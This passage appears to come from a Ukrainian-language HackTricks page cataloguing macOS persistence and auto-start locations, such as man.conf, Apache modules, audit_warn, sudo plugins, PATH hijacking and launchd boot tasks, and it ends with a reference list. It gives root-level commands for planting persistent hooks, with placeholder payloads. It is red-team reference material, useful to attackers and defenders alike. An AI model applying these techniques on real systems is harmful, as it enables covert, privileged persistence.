**`evaluate-mechanisms`** повідомить фреймворку авторизації, що для авторизації потрібно **викликати зовнішній механізм**. Крім того, **`privileged`** призведе до його запуску від імені root.

Запустіть його за допомогою:

```bash
security authorize com.asdf.asdf
```

І тоді група **staff** повинна мати доступ до **sudo** (перевірте `/etc/sudoers`, щоб підтвердити).

### Man.conf

Опис: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але потрібен root, і користувач має скористатися man
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`/private/etc/man.conf`**
  - Потрібен root
  - **`/private/etc/man.conf`**: щоразу, коли використовується man

#### Опис і експлуатація

Файл конфігурації **`/private/etc/man.conf`** визначає бінарний файл/скрипт, який використовується для відкриття файлів документації man. Тож шлях до виконуваного файла можна змінити, щоб щоразу, коли користувач використовує man для читання документації, виконувалася backdoor.<sup>[[31]](#references)</sup>

Наприклад, задайте в **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

А потім створіть `/tmp/view` як:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але потрібні права root, а apache має бути запущений
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd не має entitlements

#### Розташування

- **`/etc/apache2/httpd.conf`**
  - Потрібні права root
  - Умова спрацювання: запуск Apache2

#### Опис і експлуатація

У `/etc/apache2/httpd.conf` можна вказати завантаження модуля, додавши рядок на кшталт:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Так ваш скомпільований модуль буде завантажено Apache. Єдине: вам потрібно **підписати його дійсним сертифікатом Apple** або **додати новий довірений сертифікат** у систему й **підписати його** цим сертифікатом.

Потім, за потреби, щоб переконатися, що сервер запуститься, можна виконати:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Приклад коду для Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### Фреймворк аудиту BSM

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але для цього потрібен root, має працювати auditd і має виникнути попередження
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`/etc/security/audit_warn`**
  - Потрібен root
  - **Тригер**: коли auditd виявляє попередження

#### Опис і експлуатація

Щоразу, коли auditd виявляє попередження, запускається скрипт **`/etc/security/audit_warn`**. Тож ви можете додати туди свій payload.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Можна примусово викликати попередження за допомогою `sudo audit -n`.

### Елементи запуску

> [!CAUTION] > **Це застаріло, тому в цих каталогах нічого не має бути.**

**StartupItem** — це каталог, який має міститися в `/Library/StartupItems/` або `/System/Library/StartupItems/`. Після створення цей каталог має містити два конкретні файли:

1. **rc script**: shell-скрипт, який виконується під час запуску.
2. **Файл plist**, зокрема з назвою `StartupParameters.plist`, що містить різні налаштування конфігурації.

Переконайтеся, що і rc script, і файл `StartupParameters.plist` правильно розміщені в каталозі **StartupItem**, щоб система запуску могла їх розпізнати й використати.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Я не можу знайти цей компонент у своїй macOS, тож докладнішу інформацію дивіться у writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

**emond**, представлений Apple, — це механізм ведення журналу, який, схоже, недостатньо розроблений або, можливо, покинутий, але досі доступний. Хоча він не надто корисний для адміністратора Mac, ця маловідома служба може слугувати непомітним методом persistence для зловмисників, імовірно залишаючись непоміченою більшістю адміністраторів macOS.<sup>[[34]](#references)</sup>

Тим, хто знає про його існування, нескладно виявити будь-яке зловмисне використання **emond**. LaunchDaemon цієї служби шукає скрипти для виконання в одному каталозі. Щоб перевірити це, можна скористатися такою командою:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Розташування

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Потрібні права root
  - **Тригер**: За наявності XQuartz

#### Опис і експлуатація

XQuartz **більше не встановлюється в macOS**, тому докладніше читайте у writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Встановлення kext настільки складне, навіть із правами root, що його не вважають практичним методом обходу sandbox або закріплення в системі, якщо у вас немає експлойта.

#### Розташування

Щоб встановити KEXT як елемент автозапуску, його потрібно **встановити в одному з таких розташувань**:

- `/System/Library/Extensions`
  - Файли KEXT, вбудовані в операційну систему OS X.
- `/Library/Extensions`
  - Файли KEXT, встановлені стороннім програмним забезпеченням

Список наразі завантажених файлів kext можна отримати так:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Щоб дізнатися більше про [**розширення ядра, перегляньте цей розділ**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Опис: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Розташування

- **`/usr/local/bin/amstoold`**
  - Потрібен root

#### Опис і експлуатація

Схоже, `plist` з `/System/Library/LaunchAgents/com.apple.amstoold.plist` використовував цей бінарний файл, надаючи доступ до служби XPC... річ у тім, що самого бінарного файла не існувало, тож можна було розмістити його там, і коли викликали службу XPC, викликався б ваш бінарний файл.<sup>[[35]](#references)</sup>

Я більше не можу знайти його у своїй macOS.

### ~~xsanctl~~

Опис: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Розташування

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Потрібен root
  - **Тригер**: під час запуску служби (рідко)

#### Опис і експлуатація

Схоже, цей скрипт запускають нечасто, і я не зміг знайти його навіть у своїй macOS, тож докладніше дивіться в описі.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Це не працює в сучасних версіях MacOS**

Тут також можна розмістити **команди, які виконуватимуться під час запуску.** Приклад звичайного скрипту rc.common:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### Завдання завантаження launchd

Опис: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Корисно для обходу sandbox: [🔴](https://emojipedia.org/large-red-circle) (потрібен root)
- Потрібен root, а також або **обхід SIP**, або дозвіл **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access, залежно від шляху

#### Розташування

`launchd` вбудовує plist у свою секцію **`__TEXT,__config`**, де описано ранні «завдання завантаження». Кілька довідкових скриптів/бінарних файлів, які **не існують** за замовчуванням і які може створити зловмисник:

- Набір для обходу SIP: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- Набір TCC/FDA: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` існує за замовчуванням лише в Sequoia+)

#### Опис і експлуатація

Виведіть таблицю вбудованих завдань, щоб побачити, які файли запускатиме `launchd`, і які ключі підтримуються (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Створення одного з указаних файлів (наприклад, `/etc/rc.server`) змушує `launchd` виконати його під час наступного перезавантаження (userspace). Найкорисніші записи обмежені SIP або вимагають TCC SysAdminFiles/Full Disk Access, тож це техніка рівня root, що запускається під час перезавантаження.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Опис: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Завантажувальне завдання `rc.trampoline` під час запуску виконує **платформний бінарний файл (підписаний Apple)**, збережений у змінній NVRAM `apple-trusted-trampoline`, але **лише якщо встановлено boot-arg `rc.trampoline=1` і вимкнено SIP** (з обмеженням розміру близько 390&nbsp;KB та вимогою не блокувати виконання й швидко повертати керування). Оскільки для цього потрібні **root + вимкнений SIP + payload, підписаний Apple**, ця техніка практично непридатна для реального закріплення в системі й наведена тут лише для повноти.<sup>[[41]](#references)</sup>

### /etc/paths і /etc/paths.d (PATH hijack)

- Корисно для обходу sandbox: [🔴](https://emojipedia.org/large-red-circle) (для запису потрібен root)
- Потрібен root

#### Розташування

- **`/etc/paths`** і **`/etc/paths.d/*`** — читаються **`path_helper`** (який викликається з `/etc/zprofile`) для формування стандартного `PATH` під час входу в систему.

#### Опис і експлуатація

Обидва файли належать root. Якщо додати каталог, контрольований зловмисником, на початок списку (відредагувавши `/etc/paths` або додавши файл у `/etc/paths.d/`), цей каталог опиниться на початку `PATH` кожної нової оболонки під час входу в систему. Тож шкідливий бінарний файл з назвою поширеної команди (`ls`, `git` тощо) **затінює** справжню команду й запускається наступного разу, коли жертва її викликає.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Опис: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Корисно для обходу sandbox: [🔴](https://emojipedia.org/large-red-circle) (потрібен root)
- Потрібен root; результат — **обхід SIP**. Вразливі версії macOS **15.0–15.1**, виправлено у **15.2**

#### Розташування

- Розмістіть файловий пакет у **`/Library/Filesystems/`**.

#### Опис і експлуатація

`storagekitd` має entitlement **`com.apple.rootless.install.heritable`** і запускав бінарні файли файлових пакетів із успадкованою можливістю обходу SIP. Розмістивши шкідливий файловий пакет, зловмисник міг виконувати код із обходом SIP, щоб встановлювати **постійні kernel extensions** або записувати файли в захищені SIP каталоги `LaunchDaemon` — така персистентність переживає перезавантаження та обходить звичайні засоби захисту.<sup>[[46]](#references)</sup> Apple виправила цю проблему в macOS Sequoia 15.2.

### Плагіни sudo (/etc/sudo.conf)

Опис: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Корисно для обходу sandbox: [🔴](https://emojipedia.org/large-red-circle) (для запису в `/etc/sudo.conf` потрібен root)
- Для встановлення потрібен root; після цього плагін запускається під час **кожного виклику `sudo`** (у контексті setuid-root)

#### Розташування

- **`/etc/sudo.conf`** — рядки `Plugin` завантажують shared objects із **`/usr/libexec/sudo/`** (або за абсолютним шляхом). За замовчуванням файл відсутній (sudo використовує вбудовану політику), тому його створення — це простий hook.

#### Опис і експлуатація

`sudo` завантажує плагіни політики/підтвердження/аудиту з `/etc/sudo.conf`. Оскільки `sudo` має setuid-root, шкідливий плагін shared-object виконується з **привілеями root щоразу, коли будь-який користувач запускає `sudo`** — це забезпечує тривалу персистентність із правами root і дає змогу бачити кожну команду sudo.<sup>[[51]](#references)</sup> macOS постачається із sudo 1.9.x, що підтримує API плагінів.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Мінімальний приклад: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Застарілий механізм:** застарілий починаючи з macOS 12.3. У macOS 14.1 і новіших версіях застарілі відеоплагіни вимкнені за замовчуванням. Перш ніж цей шлях запрацює, користувач має відновити підтримку застарілого відео з Recovery; самого доступу на запис до каталогу недостатньо. [Поточні рекомендації Apple](https://support.apple.com/en-us/108387).
- Для запису до каталогу плагінів потрібен root. Виконання коду залежить від сумісного клієнта, який досі завантажує DAL-плагіни; на macOS 26 це не перевірялося під час виконання.

#### Розташування

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Потрібен root
  - **Тригер:** сумісний клієнт камери перелічує пристрої **після відновлення підтримки застарілих плагінів**. Перевірка бібліотек клієнтом може блокувати сторонній плагін.

#### Опис і експлуатація

DAL (Device Abstraction Layer) plug-ins CoreMediaIO завантажувалися в процес деякими програмами для роботи з камерою. У презентації Apple про [розширення камери](https://developer.apple.com/videos/play/wwdc2022/10022/) прямо зазначено, що застарілі DAL plug-ins **не працювали** з FaceTime, QuickTime Player або Photo Booth, а багато інших клієнтів застосовували перевірку бібліотек. Сучасні [розширення Core Media I/O](https://developer.apple.com/documentation/coremediaio) працюють поза процесом, мають окрему модель встановлення та схвалення. Історична техніка з виконанням у процесі не означає, що на сучасній macOS можна загалом обходити Camera TCC.<sup>[[53]](#references)[[54]](#references)</sup>

Спостереження лише для читання на macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` існує та належить root. Наявність підтримки застарілих плагінів і завантаження будь-яким клієнтом не перевірялися.

### Directory Service Plugins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Застарілий умовний механізм:** для встановлення потрібен root, а плагін має бути налаштований і завантажений. API плагінів DirectoryService застарілий; перш ніж вважати цей механізм тригером під час завантаження, перевірте конфігурацію Open Directory на цільовому Mac.

#### Розташування

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Потрібен root
  - **Тригер:** `dspluginhelperd` завантажує відповідний налаштований плагін за потреби Open Directory. У [посібнику Apple про середовище виконання плагінів](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) зазначено, що плагіни, не налаштовані для запуску під час старту, можуть завантажуватися відкладено, коли відкривається їхній вузол.

#### Опис і експлуатація

`dspluginhelperd` підтримує застарілі пакети плагінів DirectoryService. Шкідливий плагін може забезпечити привілейований шлях виконання, якщо застарілий плагін приймається й активується; це відрізняється від PAM і Authorization Plugins. Наявність каталогу не доводить, що новий записаний плагін запуститься під час наступного завантаження. У локальних посібниках macOS 26.5 `dspluginhelperd(8)` та `opendirectoryd(8)` досі згадуються цей helper і застарілий шлях.<sup>[[53]](#references)</sup>

Спостереження лише для читання на macOS 26: `/Library/DirectoryServices/PlugIns` і `/usr/libexec/dspluginhelperd` існують. Під час цього тесту плагіни не встановлювалися, не налаштовувалися й не завантажувалися.

## Техніки та інструменти persistence

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025: рік Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [За межами звичних LaunchAgents — 1 — файли запуску shell](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [За межами звичних LaunchAgents — 18 — X11 і XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [За межами звичних LaunchAgents — 21 — повторно відкриті програми](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [За межами звичних LaunchAgents — 20 — налаштування Terminal](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [За межами звичних LaunchAgents — 13 — аудіоплагіни](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Аудіоплагіни Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [За межами звичних LaunchAgents — 12 — плагіни QuickLook](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [За межами звичних LaunchAgents — 22 — LoginHook і LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [За межами звичних LaunchAgents — 4 — завдання cron](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [За межами звичних LaunchAgents — 2 — запуск iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [За межами звичних LaunchAgents — 7 — плагіни xbar](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [За межами звичних LaunchAgents — 8 — Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [За межами звичних LaunchAgents — 6 — SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [За межами звичних LaunchAgents — 3 — елементи входу](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [За межами звичних LaunchAgents — 14 — atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [За межами звичних LaunchAgents — 24 — дії з папками](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Дії з папками для persistence у macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [За межами звичних LaunchAgents — 27 — ярлики Dock](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [За межами звичних LaunchAgents — 17 — палітри кольорів](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [За межами звичних LaunchAgents — 26 — плагіни Finder Sync](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Аналіз persistence механізму «Mac File Opener» (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [За межами звичних LaunchAgents — 16 — заставка](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Збереження доступу: заставки для persistence у macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [За межами звичних LaunchAgents — 11 — імпортери Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [За межами звичних LaunchAgents — 9 — панель налаштувань](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [За межами звичних LaunchAgents — 19 — періодичні скрипти](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [За межами звичних LaunchAgents — 5 — підключувані модулі автентифікації (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [За межами звичних LaunchAgents — 28 — плагіни Authorization](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Постійне викрадення облікових даних за допомогою плагінів Authorization (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [За межами звичних LaunchAgents — 30 — файл конфігурації man — man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [За межами звичних LaunchAgents — 25 — модулі Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [За межами звичних LaunchAgents — 31 — фреймворк аудиту BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [За межами звичних LaunchAgents — 23 — emond, демон моніторингу подій](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [За межами звичних LaunchAgents — 29 — amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [За межами звичних LaunchAgents — 15 — xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [За межами звичних LaunchAgents — 10 — файли скриптів програм](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [За межами звичних LaunchAgents — 32 — плагіни плиток Dock](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [За межами звичних LaunchAgents — 33 — віджети](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [За межами звичних LaunchAgents — 34 — завдання завантаження launchd](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [За межами звичних LaunchAgents — 35 — persistence через NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Використання електронної пошти для persistence в OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Підозріла зміна plist-правила Apple Mail (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Шкідливі профілі — одна з найсерйозніших загроз для Mac (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Мистецтво Mac Malware, том 1 — розділ 0x2: Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Аналіз CVE-2024-44243 — обхід macOS SIP через розширення ядра (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE і викрадення API-токенів через файли проєктів Claude Code (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Нова вразливість у GitHub Copilot і Cursor — бекдор у файлі правил (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome — альтернативні способи встановлення (зовнішні розширення)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Видалення ExtensionInstallForcelist у Chrome на Mac (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Про написання плагінів Sudo (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Віддалена експлуатація Mac через власні URL-схеми (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Два прийоми persistence у macOS із використанням плагінів (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Мінімальний приклад CoreMediaIO DAL (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: аналіз уразливості macOS TCC на основі Spotlight (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Документація модуля Python `site` (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
- [57] [Від Spotlight до Apple Intelligence — використання 0day для викрадення даних, що живлять ШІ macOS](https://objective-see.org/blog/blog_0x81.html)
- [58] [PEP 829 — файли конфігурації запуску пакетів](https://peps.python.org/pep-0829/)
- [59] [Документація Python 3.15 `site` — точки входу під час запуску](https://docs.python.org/3.15/library/site.html)
- [60] [autorun-audit — PEP 829 і файли `.start`](https://github.com/ag3ntsc4rn/autorun-audit)
{{#include ../banners/hacktricks-training.md}}
